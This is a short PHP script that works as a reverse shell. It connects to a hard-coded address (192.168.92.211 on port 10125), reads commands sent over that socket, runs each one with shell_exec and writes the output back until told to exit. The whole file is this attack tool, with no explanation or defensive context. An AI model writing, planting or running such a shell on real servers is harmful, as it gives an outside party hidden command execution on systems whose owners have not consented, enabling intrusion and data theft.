<?php
$host = '192.168.92.211';
$port = 10125;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, $host, $port);

while (true) {
    $command = socket_read($socket, 1024);
    if (strtolower($command) == 'exit') {
        break;
    }

    $output = shell_exec($command);
    socket_write($socket, $output, strlen($output));
}

socket_close($socket);
?>
